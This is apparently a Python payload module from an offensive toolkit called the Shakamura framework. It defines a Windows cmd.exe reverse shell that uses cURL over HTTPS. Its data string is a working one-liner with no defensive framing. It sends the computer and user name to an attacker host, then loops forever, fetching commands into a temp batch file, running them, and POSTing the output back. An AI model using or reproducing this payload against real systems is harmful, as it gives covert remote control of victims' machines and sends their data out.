# This module is part of the Shakamura framework

class Payload:

    info = {
        'Title' : 'Windows CMD cURL Shakamura https',
        'Author' : 'Panagiotis Chartas (r0jahsm0ntar1)',
        'Description' : 'An Https based beacon-like reverse shell that utilizes cURL',
        'References' : ['https://github.com/r0jahsm0ntar1/shakamura', 'https://revshells.com']
    }

    meta = {
        'handler' : 'shakamura',
        'type' : 'cmd-curl-ssl',
        'os' : 'windows',
        'shell' : 'cmd.exe'
    }

    config = {
        'frequency' : 1
    }

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = '@echo off&cmd /V:ON /C "SET ip=*LHOST*&&SET sid="*HOAXID*: *SESSIONID*"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/*VERIFY*/!COMPUTERNAME!/!USERNAME! -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/*GETCMD* -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl -fs -k !protocol!!ip!/*POSTRES* -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout *FREQ*" > NUL'
